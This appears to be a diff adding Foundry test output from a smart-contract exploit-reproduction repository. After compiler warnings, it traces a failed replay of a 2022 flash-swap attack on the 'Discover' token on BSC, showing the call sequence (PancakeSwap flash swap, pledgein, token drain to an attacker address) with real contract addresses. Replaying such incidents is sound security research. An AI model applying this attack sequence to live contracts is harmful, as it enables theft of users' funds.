@@ -1,0 +1,143 @@
+Compiling 26 files with Solc 0.8.25
+Compiling 25 files with Solc 0.8.10
+Solc 0.8.10 finished in 960.14ms
+Solc 0.8.25 finished in 1.03s
+Compiler run successful with warnings:
+Warning (2519): This declaration shadows an existing declaration.
+   --> src/test/interface.sol:886:5:
+    |
+886 |     function WETH() external view returns (address);
+    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:1598:5:
+     |
+1598 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:1850:5:
+     |
+1850 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:2560:5:
+     |
+2560 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:3759:5:
+     |
+3759 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+
+Ran 1 test for script/Exploit-template_new.sol:ExploitScript
+[PASS] testExploit() (gas: 20485)
+Logs:
+  Attacker ETH Balance Before exploit: 0.000000000000000000
+  Attacker ETH Balance After exploit: 0.000000000000000000
+
+Traces:
+  [20485] ExploitScript::testExploit()
+    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
+    │   └─ ← [Return] 
+    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
+    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
+    └─ ← [Stop] 
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 257.41ms (107.37µs CPU time)
+
+Ran 1 test for src/test/2022-06/Discover_exp.sol:ContractTest
+[FAIL. Reason: revert: Pancake: INSUFFICIENT_INPUT_AMOUNT] testExploit() (gas: 495297)
+Logs:
+  Before flashswap, BUSD balance of attacker:: 0
+  After flashswap, BUSD balance of attacker:: 19810777285664651588959
+  After Exploit, discover balance of attacker:: 62536761454652895417957
+
+Traces:
+  [495297] ContractTest::testExploit()
+    ├─ [2531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ emit log_named_uint(key: "Before flashswap, BUSD balance of attacker:", val: 0)
+    ├─ [479878] 0x92f961B6bb19D35eedc1e174693aAbA85Ad2425d::swap(19810777285664651588959 [1.981e22], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000431f1c37350c2d7b55f)
+    │   ├─ [27971] 0x55d398326f99059fF775485246999027B3197955::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 19810777285664651588959 [1.981e22])
+    │   │   ├─ emit Transfer(from: 0x92f961B6bb19D35eedc1e174693aAbA85Ad2425d, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 19810777285664651588959 [1.981e22])
+    │   │   └─ ← [Return] true
+    │   ├─ [434825] ContractTest::pancakeCall(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 19810777285664651588959 [1.981e22], 0, 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000431f1c37350c2d7b55f)
+    │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 19810777285664651588959 [1.981e22]
+    │   │   ├─ emit log_named_uint(key: "After flashswap, BUSD balance of attacker:", val: 19810777285664651588959 [1.981e22])
+    │   │   ├─ [420457] 0xe732a7bD6706CBD6834B300D7c56a8D2096723A7::pledgein(0xAb21300fA507Ab30D50c3A5D1Cad617c19E83930, 2000000000000000000000 [2e21])
+    │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 19810777285664651588959 [1.981e22]
+    │   │   │   ├─ [15634] 0x55d398326f99059fF775485246999027B3197955::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xe732a7bD6706CBD6834B300D7c56a8D2096723A7, 1660000000000000000000 [1.66e21])
+    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xe732a7bD6706CBD6834B300D7c56a8D2096723A7, value: 1660000000000000000000 [1.66e21])
+    │   │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0xe732a7bD6706CBD6834B300D7c56a8D2096723A7, value: 115792089237316195423570985008687907853269984665640564037797584007913129639935 [1.157e77])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [10834] 0x55d398326f99059fF775485246999027B3197955::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x6311ec03801077A5F8343e234dA3Ea5C49AFc5F9, 200000000000000000000 [2e20])
+    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x6311ec03801077A5F8343e234dA3Ea5C49AFc5F9, value: 200000000000000000000 [2e20])
+    │   │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0xe732a7bD6706CBD6834B300D7c56a8D2096723A7, value: 115792089237316195423570985008687907853269984665640564037597584007913129639935 [1.157e77])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [10834] 0x55d398326f99059fF775485246999027B3197955::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xd2C84E295a3b54861bc32B76a0E567Dba608b092, 140000000000000000000 [1.4e20])
+    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xd2C84E295a3b54861bc32B76a0E567Dba608b092, value: 140000000000000000000 [1.4e20])
+    │   │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0xe732a7bD6706CBD6834B300D7c56a8D2096723A7, value: 115792089237316195423570985008687907853269984665640564037457584007913129639935 [1.157e77])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x92f961B6bb19D35eedc1e174693aAbA85Ad2425d) [staticcall]
+    │   │   │   │   └─ ← [Return] 777000000000000000 [7.77e17]
+    │   │   │   ├─ [2952] 0x5908E4650bA07a9cf9ef9FD55854D4e1b700A267::balanceOf(0x92f961B6bb19D35eedc1e174693aAbA85Ad2425d) [staticcall]
+    │   │   │   │   └─ ← [Return] 12147765912566297044558 [1.214e22]
+    │   │   │   ├─ [2952] 0x5908E4650bA07a9cf9ef9FD55854D4e1b700A267::balanceOf(0xe732a7bD6706CBD6834B300D7c56a8D2096723A7) [staticcall]
+    │   │   │   │   └─ ← [Return] 603644007472699128296549 [6.036e23]
+    │   │   │   ├─ [38225] 0x5908E4650bA07a9cf9ef9FD55854D4e1b700A267::transfer(0xAb21300fA507Ab30D50c3A5D1Cad617c19E83930, 62536761454652895417957 [6.253e22])
+    │   │   │   │   ├─ emit Transfer(from: 0xe732a7bD6706CBD6834B300D7c56a8D2096723A7, to: 0xAb21300fA507Ab30D50c3A5D1Cad617c19E83930, value: 62536761454652895417957 [6.253e22])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x0000000000000000000000000000000000000000, value: 99)
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [952] 0x5908E4650bA07a9cf9ef9FD55854D4e1b700A267::balanceOf(0xAb21300fA507Ab30D50c3A5D1Cad617c19E83930) [staticcall]
+    │   │   │   └─ ← [Return] 62536761454652895417957 [6.253e22]
+    │   │   ├─ emit log_named_uint(key: "After Exploit, discover balance of attacker:", val: 62536761454652895417957 [6.253e22])
+    │   │   └─ ← [Stop] 
+    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x92f961B6bb19D35eedc1e174693aAbA85Ad2425d) [staticcall]
+    │   │   └─ ← [Return] 777000000000000000 [7.77e17]
+    │   ├─ [952] 0x5908E4650bA07a9cf9ef9FD55854D4e1b700A267::balanceOf(0x92f961B6bb19D35eedc1e174693aAbA85Ad2425d) [staticcall]
+    │   │   └─ ← [Return] 12147765912566297044558 [1.214e22]
+    │   └─ ← [Revert] revert: Pancake: INSUFFICIENT_INPUT_AMOUNT
+    └─ ← [Revert] revert: Pancake: INSUFFICIENT_INPUT_AMOUNT
+
+Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 289.71ms (2.44ms CPU time)
+
+Ran 2 test suites in 290.78ms (547.13ms CPU time): 1 tests passed, 1 failed, 0 skipped (2 total tests)
+
+Failing tests:
+Encountered 1 failing test in src/test/2022-06/Discover_exp.sol:ContractTest
+[FAIL. Reason: revert: Pancake: INSUFFICIENT_INPUT_AMOUNT] testExploit() (gas: 495297)
+
+Encountered a total of 1 failing tests, 1 tests succeeded
